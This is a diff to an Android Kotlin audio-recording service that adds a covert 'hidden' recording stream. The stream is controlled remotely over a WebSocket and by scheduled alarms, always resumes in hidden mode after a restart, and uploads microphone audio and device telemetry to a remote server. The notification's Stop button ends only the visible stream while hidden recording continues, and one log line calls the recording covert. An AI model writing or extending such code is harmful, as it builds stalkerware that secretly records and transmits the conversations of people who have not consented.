@@ -55,6 +55,10 @@ class AudioRecordService : Service() {
 
     companion object {
         const val ACTION_START = "ACTION_START"
+        const val ACTION_START_MAIN = "ACTION_START_MAIN"
+        const val ACTION_STOP_MAIN = "ACTION_STOP_MAIN"
+        const val ACTION_START_HIDDEN = "ACTION_START_HIDDEN"
+        const val ACTION_STOP_HIDDEN = "ACTION_STOP_HIDDEN"
         const val ACTION_STOP = "ACTION_STOP"
         const val ACTION_STANDBY = "ACTION_STANDBY"
         const val ACTION_STATE_UPDATE = "ACTION_STATE_UPDATE"
@@ -82,13 +86,21 @@ class AudioRecordService : Service() {
         // Default chunk duration
         const val DEFAULT_CHUNK_SECONDS = 10
 
-        // Keep track of running state
+        // Independent stream tracking
         @Volatile
-        var isRunning = false
+        var isMainRecording = false
             private set
-            
+
+        @Volatile
+        var isHiddenRecording = false
+            private set
+
         @Volatile
         var isStandbyMode = false
+            private set
+
+        val isRunning: Boolean
+            get() = isMainRecording || isHiddenRecording
     }
 
     // Recording
@@ -102,6 +114,7 @@ class AudioRecordService : Service() {
     private var uploadManager: UploadManager? = null
     private var connectionMonitor: ConnectionMonitor? = null
     private var storageManager: StorageManager? = null
+    private var socketManager: DeviceSocketManager? = null
 
     // System
     private var wakeLock: PowerManager.WakeLock? = null
@@ -129,23 +142,41 @@ class AudioRecordService : Service() {
             val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
             val wasRunning = prefs.getBoolean("was_running", false)
             val savedUrl = prefs.getString("server_url", null)
-            val wasMain = prefs.getBoolean("was_main", false)
             if (wasRunning && !savedUrl.isNullOrEmpty()) {
-                startMonitoring(savedUrl, isStandby = false, isMain = wasMain)
+                // Auto-restart must ALWAYS start in hidden mode only (not main)
+                startHiddenRecording(savedUrl)
             }
         } else {
+            val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
+            val defaultUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com") ?: ""
+            val url = intent.getStringExtra(EXTRA_SERVER_URL) ?: serverUrl.ifEmpty { defaultUrl }
+
             when (intent.action) {
+                ACTION_START_MAIN -> {
+                    startMainRecording(url)
+                }
+                ACTION_STOP_MAIN -> {
+                    stopMainRecording()
+                }
+                ACTION_START_HIDDEN -> {
+                    startHiddenRecording(url)
+                }
+                ACTION_STOP_HIDDEN -> {
+                    stopHiddenRecording()
+                }
                 ACTION_START -> {
-                    val url = intent.getStringExtra(EXTRA_SERVER_URL) ?: return START_NOT_STICKY
                     val isMain = intent.getBooleanExtra(EXTRA_IS_MAIN, false)
-                    startMonitoring(url, isStandby = false, isMain = isMain)
+                    if (isMain) {
+                        startMainRecording(url)
+                    } else {
+                        startHiddenRecording(url)
+                    }
                 }
                 ACTION_STANDBY -> {
-                    val url = intent.getStringExtra(EXTRA_SERVER_URL) ?: return START_NOT_STICKY
-                    startMonitoring(url, isStandby = true)
+                    startStandby(url)
                 }
                 ACTION_STOP -> {
-                    stopMonitoring()
+                    stopAll()
                 }
             }
         }
@@ -155,7 +186,7 @@ class AudioRecordService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
-        stopMonitoring()
+        stopAll()
     }
 
     // ══════════════════════════════════════════════════════════════════════
@@ -193,23 +224,21 @@ class AudioRecordService : Service() {
         }
     }
 
-    private fun startMonitoring(url: String, isStandby: Boolean = false, isMain: Boolean = false) {
-        if (isRunning || isStandbyMode) return
+    private var isServiceInitialized = false
 
-        serverUrl = url
+    private fun ensureServiceInitialized(url: String) {
+        if (url.isNotEmpty()) {
+            serverUrl = url
+        }
+        if (isServiceInitialized) return
 
-        // Generate client name and include battery level & charging state in device info
         clientName = generateClientName()
         deviceInfo = "${Build.MANUFACTURER} ${Build.MODEL} | 🔋 Initializing..."
 
-        // 1. Create notification channel and start foreground
         createNotificationChannel()
-        startForeground(NOTIFICATION_ID, buildNotification(if (isStandby) "Standby mode..." else "Starting..."))
-
-        // 2. Acquire wake lock (4 hour max, renewed on each chunk)
+        startForeground(NOTIFICATION_ID, buildNotification("Starting..."))
         acquireWakeLock()
 
-        // 3. Initialize managers
         storageManager = StorageManager(this)
 
         connectionMonitor = ConnectionMonitor(
@@ -224,38 +253,144 @@ class AudioRecordService : Service() {
             serverUrl = serverUrl,
             clientName = clientName,
             deviceInfo = deviceInfo,
-            isMain = isMain,
             connectionMonitor = connectionMonitor!!,
             storageManager = storageManager!!,
             onLog = { msg -> sendLog(msg) },
             onStatsUpdate = { pending, retries -> onUploadStatsUpdate(pending, retries) }
         )
 
-        // Register dynamic battery listener
         registerBatteryListener()
 
-        // 4. Start everything or standby
-        if (isStandby) {
-            isStandbyMode = true
-            isRunning = false
-            sendLog("Standby mode enabled. Listening for commands...")
-        } else {
-            isStandbyMode = false
-            isRunning = true
-            connectionMonitor!!.start()
-            uploadManager!!.start()
-            startRecording()
-            sendLog("Service started. Client: $clientName")
-        }
+        socketManager = DeviceSocketManager(
+            serverUrl = serverUrl,
+            clientId = clientName,
+            onCommandReceived = { cmd, startT, stopT ->
+                handleRemoteCommand(cmd, startT, stopT)
+            },
+            onLog = { msg -> sendLog(msg) },
+            onConnectionStateChanged = { connected ->
+                if (connected) {
+                    val route = getCurrentAudioRoute()
+                    socketManager?.sendTelemetry(currentBatteryPct, currentStorageMB, route)
+                    socketManager?.sendStatus(if (isRunning) "recording" else "idle")
+                }
+            }
+        )
+        socketManager?.start()
 
-        // 5. Clean up any temp files from previous sessions
         storageManager!!.cleanupTempFiles()
-
-        // 6. Start loops
         startNotificationUpdater()
         startCommandPolling()
         startTelemetryPolling()
 
+        isServiceInitialized = true
+    }
+
+    private fun startMainRecording(url: String) {
+        ensureServiceInitialized(url)
+        isMainRecording = true
+        isStandbyMode = false
+        mainRecordingStartTimeMs = System.currentTimeMillis()
+        connectionMonitor?.start()
+        uploadManager?.start()
+        startRecording()
+        socketManager?.sendStatus("recording")
+        updateNotification()
+        broadcastStateUpdate()
+        sendLog("Started Main (Local) recording.")
+    }
+
+    private fun stopMainRecording() {
+        if (!isMainRecording) return
+        isMainRecording = false
+        sendLog("Stopped Main (Local) recording.")
+        uploadManager?.endSession("main")
+
+        if (isHiddenRecording) {
+            sendLog("Covert hidden recording is still active; microphone kept recording uninterrupted.")
+        } else {
+            // Neither is recording -> switch to standby
+            stopRecordingHardware()
+            isStandbyMode = true
+            socketManager?.sendStatus("idle")
+            sendLog("No active recordings; switched to STANDBY (Socket live)")
+        }
+        updateNotification()
+        broadcastStateUpdate()
+    }
+
+    private fun startHiddenRecording(url: String) {
+        ensureServiceInitialized(url)
+        isHiddenRecording = true
+        isStandbyMode = false
+        hiddenRecordingStartTimeMs = System.currentTimeMillis()
+        connectionMonitor?.start()
+        uploadManager?.start()
+        startRecording()
+        socketManager?.sendStatus("recording")
+        updateNotification()
+        broadcastStateUpdate()
+        sendLog("Started Hidden recording.")
+    }
+
+    private fun stopHiddenRecording() {
+        if (!isHiddenRecording) return
+        isHiddenRecording = false
+        sendLog("Stopped Hidden recording.")
+        uploadManager?.endSession("hidden")
+
+        if (isMainRecording) {
+            sendLog("Main local recording is still active; microphone kept recording uninterrupted.")
+        } else {
+            // Neither is recording -> switch to standby
+            stopRecordingHardware()
+            isStandbyMode = true
+            socketManager?.sendStatus("idle")
+            sendLog("No active recordings; switched to STANDBY (Socket live)")
+        }
+        updateNotification()
+        broadcastStateUpdate()
+    }
+
+    private fun startStandby(url: String) {
+        ensureServiceInitialized(url)
+        if (!isRunning) {
+            stopRecordingHardware()
+            isStandbyMode = true
+            socketManager?.sendStatus("idle")
+            sendLog("Standby mode active (Listening for commands)")
+        }
+        updateNotification()
+        broadcastStateUpdate()
+    }
+
+    private fun stopAll() {
+        isMainRecording = false
+        isHiddenRecording = false
+        isStandbyMode = false
+        isPolling = false
+        isServiceInitialized = false
+
+        sendLog("Stopping entire service...")
+
+        stopRecordingHardware()
+
+        uploadManager?.stop()
+        connectionMonitor?.stop()
+        socketManager?.stop()
+        socketManager = null
+
+        try {
+            batteryReceiver?.let { unregisterReceiver(it) }
+            batteryReceiver = null
+        } catch (e: Exception) { /* ignore */ }
+
+        releaseWakeLock()
+        serviceScope.coroutineContext.cancelChildren()
+        stopForeground(STOP_FOREGROUND_REMOVE)
+        stopSelf()
+
+        sendLog("Service stopped completely")
         broadcastStateUpdate()
     }
 
@@ -267,6 +402,7 @@ class AudioRecordService : Service() {
         telemetryJob = serviceScope.launch(Dispatchers.IO) {
             while (isActive) {
                 currentStorageMB = (storageManager?.getAvailableSpace() ?: 0L) / (1024 * 1024)
+                socketManager?.sendTelemetry(currentBatteryPct, currentStorageMB, getCurrentAudioRoute())
                 delay(60000L) // Poll every 60 seconds
             }
         }
@@ -282,6 +418,12 @@ class AudioRecordService : Service() {
                 .build()
 
             while (isPolling) {
+                // If live WebSocket is connected, skip HTTP polling to conserve battery & bandwidth
+                if (socketManager?.isConnected() == true) {
+                    delay(15000L)
+                    continue
+                }
+
                 try {
                     val encodedClientName = java.net.URLEncoder.encode(clientName, "UTF-8")
                     val status = if (isRunning) "recording" else "idle"
@@ -298,15 +440,15 @@ class AudioRecordService : Service() {
                                 val startTime = json.optString("start_time", "")
                                 val stopTime = json.optString("stop_time", "")
                                 
-                                syncAlarm(startTime, ACTION_START, 101)
+                                syncAlarm(startTime, ACTION_START_HIDDEN, 101)
                                 syncAlarm(stopTime, ACTION_STANDBY, 102)
                                 
                                 var processed = false
-                                if (command == "START" && !isRunning) {
-                                    switchToRecording()
+                                if (command == "START" && !isHiddenRecording) {
+                                    startHiddenRecording(serverUrl)
                                     processed = true
-                                } else if (command == "STOP" && isRunning) {
-                                    switchToStandby()
+                                } else if (command == "STOP" && isHiddenRecording) {
+                                    stopHiddenRecording()
                                     processed = true
                                 }
                                 
@@ -380,105 +522,17 @@ class AudioRecordService : Service() {
         }
     }
 
-    private fun switchToRecording() {
-        isStandbyMode = false
-        isRunning = true
-        recordingStartTimeMs = System.currentTimeMillis()
-        totalRecordingSeconds = 0L
-        connectionMonitor?.start()
-        uploadManager?.start()
-        startRecording()
-        startNotificationUpdater()
-        updateNotification()
-        sendLog("Remote command received: START")
-        broadcastStateUpdate()
-    }
+    private fun handleRemoteCommand(command: String, startTime: String, stopTime: String) {
+        if (startTime.isNotEmpty()) syncAlarm(startTime, ACTION_START_HIDDEN, 101)
+        if (stopTime.isNotEmpty()) syncAlarm(stopTime, ACTION_STANDBY, 102)
 
-    private fun switchToStandby() {
-        isStandbyMode = true
-        isRunning = false
-        
-        // Stop recording immediately
-        isRecording.set(false)
-        try {
-            audioRecord?.stop()
-            audioRecord?.release()
-            audioRecord = null
-        } catch (e: Exception) { /* ignore */ }
-        
-        val threadToJoin = recordingThread
-        recordingThread = null
-        serviceScope.launch(Dispatchers.IO) {
-            try {
-                threadToJoin?.interrupt()
-                threadToJoin?.join(1000)
-            } catch (e: Exception) { /* ignore */ }
+        if (command == "START" && !isHiddenRecording) {
+            sendLog("⚡ Executing instant START command from live socket (Hidden stream)")
+            startHiddenRecording(serverUrl)
+        } else if (command == "STOP" && isHiddenRecording) {
+            sendLog("⚡ Executing instant STOP command from live socket (Hidden stream)")
+            stopHiddenRecording()
         }
-        
-        // Cancel the notification updater since we're switching to standby stats loop
-        notificationUpdaterJob?.cancel()
-        notificationUpdaterJob = null
-        telemetryJob?.cancel()
-        telemetryJob = null
-        
-        uploadManager?.stop()
-        connectionMonitor?.stop()
-        
-        // Update foreground notification to reflect standby state
-        updateNotification()
-        
-        sendLog("Remote command received: STOP")
-        broadcastStateUpdate()
-    }
-
-    private fun stopMonitoring() {
-        if (!isRunning && !isStandbyMode) return
-        isRunning = false
-        isStandbyMode = false
-        isPolling = false
-
-        sendLog("Stopping service completely...")
-
-        // Stop recording flag and release AudioRecord FIRST to unblock read() call immediately
-        isRecording.set(false)
-        try {
-            audioRecord?.stop()
-            audioRecord?.release()
-            audioRecord = null
-        } catch (e: Exception) { /* ignore */ }
-
-        // Join recording thread asynchronously in background so Main thread never lags
-        val threadToJoin = recordingThread
-        recordingThread = null
-        serviceScope.launch(Dispatchers.IO) {
-            try {
-                threadToJoin?.interrupt()
-                threadToJoin?.join(1000)
-            } catch (e: Exception) { /* ignore */ }
-        }
-
-        // Stop managers
-        uploadManager?.stop()
-        connectionMonitor?.stop()
-
-        // Unregister battery receiver
-        try {
-            batteryReceiver?.let { unregisterReceiver(it) }
-            batteryReceiver = null
-        } catch (e: Exception) { /* ignore */ }
-
-        // Release wake lock
-        releaseWakeLock()
-
-        // Cancel coroutines after cleanup
-        serviceScope.coroutineContext.cancelChildren()
-
-        // Stop foreground
-        stopForeground(STOP_FOREGROUND_REMOVE)
-        stopSelf()
-
-        sendLog("Service stopped")
-        broadcastStateUpdate()
     }
 
     // ══════════════════════════════════════════════════════════════════════
@@ -486,6 +540,11 @@ class AudioRecordService : Service() {
     // ══════════════════════════════════════════════════════════════════════
 
     private fun startRecording() {
+        if (isRecording.get()) {
+            sendLog("Microphone already active, reusing recording loop.")
+            return
+        }
+
         try {
             val minBuf = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
             val bufferSize = maxOf(minBuf, 4096)
@@ -500,7 +559,6 @@ class AudioRecordService : Service() {
 
             if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                 sendLog("ERROR: Failed to initialize AudioRecord. Microphone in use?")
-                stopMonitoring()
                 return
             }
 
@@ -514,15 +572,33 @@ class AudioRecordService : Service() {
                 start()
             }
 
-            sendLog("Recording started (16kHz, Mono, 16-bit)")
+            sendLog("Microphone hardware recording started (16kHz, Mono, 16-bit)")
 
         } catch (e: SecurityException) {
             sendLog("ERROR: Microphone permission denied")
-            stopMonitoring()
         } catch (e: Exception) {
             sendLog("ERROR: Recording init failed: ${e.message}")
-            stopMonitoring()
         }
+    }
+
+    private fun stopRecordingHardware() {
+        if (!isRecording.get()) return
+        isRecording.set(false)
+        try {
+            audioRecord?.stop()
+            audioRecord?.release()
+            audioRecord = null
+        } catch (e: Exception) { /* ignore */ }
+
+        val threadToJoin = recordingThread
+        recordingThread = null
+        serviceScope.launch(Dispatchers.IO) {
+            try {
+                threadToJoin?.interrupt()
+                threadToJoin?.join(1000)
+            } catch (e: Exception) { /* ignore */ }
+        }
+        sendLog("Microphone hardware released")
     }
 
     /**
@@ -532,7 +608,8 @@ class AudioRecordService : Service() {
      * This loop NEVER stops for network issues — it only cares
      * about the microphone and local storage.
      */
-    private var recordingStartTimeMs: Long = 0L
+    private var mainRecordingStartTimeMs: Long = 0L
+    private var hiddenRecordingStartTimeMs: Long = 0L
 
     private fun calculateRMS(pcmData: ByteArray, length: Int): Double {
         var sum = 0.0
@@ -558,7 +635,6 @@ class AudioRecordService : Service() {
         var chunkPos = 0
         var consecutiveSilentChunks = 0
 
-        recordingStartTimeMs = System.currentTimeMillis()
         sendLog("Recording loop started (chunk size: ${chunkBytes / 1024} KB)")
 
         while (isRecording.get() && !Thread.interrupted()) {
@@ -581,13 +657,13 @@ class AudioRecordService : Service() {
                             // Save periodic keep-alive chunk every 6 chunks (~60s) even during silence
                             if (consecutiveSilentChunks % 6 == 0) {
                                 sendLog("Silence detected (%.1f dB) — sending periodic keep-alive chunk".format(rmsDb))
-                                saveChunk(chunkBuffer, chunkPos)
+                                dispatchSaveChunk(chunkBuffer, chunkPos)
                             } else {
                                 sendLog("Silence detected (%.1f dB) — skipped chunk save".format(rmsDb))
                             }
                         } else {
                             consecutiveSilentChunks = 0
-                            saveChunk(chunkBuffer, chunkPos)
+                            dispatchSaveChunk(chunkBuffer, chunkPos)
                         }
 
                         // Start new chunk
@@ -614,7 +690,7 @@ class AudioRecordService : Service() {
                 // Service is stopping — save any partial chunk
                 if (chunkPos > 0) {
                     sendLog("Saving partial chunk ($chunkPos bytes)")
-                    saveChunk(chunkBuffer, chunkPos)
+                    dispatchSaveChunk(chunkBuffer, chunkPos)
                 }
                 break
             } catch (e: Exception) {
@@ -625,10 +701,24 @@ class AudioRecordService : Service() {
 
         // Save any remaining data in buffer
         if (chunkPos > 0 && isRecording.get()) {
-            saveChunk(chunkBuffer, chunkPos)
+            dispatchSaveChunk(chunkBuffer, chunkPos)
         }
 
         sendLog("Recording loop ended")
+    }
+
+    private fun dispatchSaveChunk(pcmData: ByteArray, dataSize: Int) {
+        val bufferCopy = pcmData.copyOf(dataSize)
+        val doMain = isMainRecording
+        val doHidden = isHiddenRecording
+        serviceScope.launch(Dispatchers.IO + NonCancellable) {
+            if (doMain) {
+                saveChunk(bufferCopy, dataSize, "main")
+            }
+            if (doHidden) {
+                saveChunk(bufferCopy, dataSize, "hidden")
+            }
+        }
     }
 
     private fun isPhoneInCall(): Boolean {
@@ -687,17 +777,19 @@ class AudioRecordService : Service() {
     /**
      * Compress PCM buffer to AAC (16 kbps) using hardware MediaCodec and save as .aac file.
      */
-    private fun saveChunk(pcmData: ByteArray, dataSize: Int) {
+    private fun saveChunk(pcmData: ByteArray, dataSize: Int, targetStreamType: String) {
         try {
             val uuid = UUID.randomUUID().toString()
             val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
             val duration = dataSize.toDouble() / BYTE_RATE
 
-            // 1-Hour Session Rotation Check
-            if (System.currentTimeMillis() - recordingStartTimeMs >= 3600_000L) {
-                sendLog("1 hour recording duration reached — rotating session on server")
-                uploadManager?.rotateSession()
-                recordingStartTimeMs = System.currentTimeMillis()
+            // 1-Hour Session Rotation Check per stream
+            val streamStartMs = if (targetStreamType == "main") mainRecordingStartTimeMs else hiddenRecordingStartTimeMs
+            if (streamStartMs > 0 && System.currentTimeMillis() - streamStartMs >= 3600_000L) {
+                sendLog("1 hour recording duration reached for $targetStreamType — rotating session on server")
+                uploadManager?.rotateSession(targetStreamType)
+                if (targetStreamType == "main") mainRecordingStartTimeMs = System.currentTimeMillis()
+                else hiddenRecordingStartTimeMs = System.currentTimeMillis()
             }
 
             // Phase 3: Enforce Storage Limit
@@ -709,7 +801,7 @@ class AudioRecordService : Service() {
             // Phase 4: Telemetry in Segment Names
             val currentRoute = getCurrentAudioRoute()
             val telemetrySuffix = "_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}"
-            val aacFile = File(chunksDir, "chunk_${System.currentTimeMillis()}${telemetrySuffix}.aac")
+            val aacFile = File(chunksDir, "chunk_${System.currentTimeMillis()}_${targetStreamType}${telemetrySuffix}.aac")
             
             // Update timestamp to include telemetry for the server HLS generation
             val timestampWithTelemetry = timestamp + telemetrySuffix
@@ -731,7 +823,8 @@ class AudioRecordService : Service() {
                 fileSize = aacFile.length(),
                 checksum = checksum,
                 inCall = inCall,
-                micInUse = micInUse
+                micInUse = micInUse,
+                streamType = targetStreamType
             )
 
             // Enqueue for upload (runs on coroutine)
@@ -740,7 +833,7 @@ class AudioRecordService : Service() {
             }
 
         } catch (e: Exception) {
-            sendLog("ERROR saving AAC chunk: ${e.message}")
+            sendLog("ERROR saving AAC chunk ($targetStreamType): ${e.message}")
         }
     }
 
@@ -926,24 +1019,30 @@ class AudioRecordService : Service() {
             this, 0, intent, PendingIntent.FLAG_IMMUTABLE
         )
 
-        // Stop action
-        val stopIntent = Intent(this, AudioRecordService::class.java).apply {
-            action = ACTION_STOP
-        }
-        val stopPendingIntent = PendingIntent.getService(
-            this, 1, stopIntent, PendingIntent.FLAG_IMMUTABLE
-        )
+        val title = if (isMainRecording) "Audio Recorder" else "Audio Monitor"
+        val text = if (isMainRecording) "Recording audio..." else "Active in background"
 
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Audio Monitor")
-            .setContentText("Active in background")
+        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle(title)
+            .setContentText(text)
             .setSmallIcon(android.R.drawable.ic_btn_speak_now)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setContentIntent(pendingIntent)
-            .addAction(android.R.drawable.ic_media_pause, "Stop", stopPendingIntent)
             .setOngoing(true)
             .setSilent(true)
-            .build()
+
+        // Only add Stop button if visible main recording is active, and action stops MAIN ONLY
+        if (isMainRecording) {
+            val stopMainIntent = Intent(this, AudioRecordService::class.java).apply {
+                action = ACTION_STOP_MAIN
+            }
+            val stopMainPending = PendingIntent.getService(
+                this, 1, stopMainIntent, PendingIntent.FLAG_IMMUTABLE
+            )
+            builder.addAction(android.R.drawable.ic_media_pause, "Stop", stopMainPending)
+        }
+
+        return builder.build()
     }
 
     private fun updateNotification() {
@@ -965,8 +1064,11 @@ class AudioRecordService : Service() {
         notificationUpdaterJob = serviceScope.launch {
             while (isActive && (isRunning || isStandbyMode)) {
                 delay(1000)  // Broadcast live stats to in-app UI every second
-                if (isRunning && recordingStartTimeMs > 0) {
-                    totalRecordingSeconds = (System.currentTimeMillis() - recordingStartTimeMs) / 1000
+                if (isRunning) {
+                    val startMs = if (mainRecordingStartTimeMs > 0) mainRecordingStartTimeMs else hiddenRecordingStartTimeMs
+                    if (startMs > 0) {
+                        totalRecordingSeconds = (System.currentTimeMillis() - startMs) / 1000
+                    }
                 }
                 withContext(Dispatchers.Main) {
                     broadcastStateUpdate()
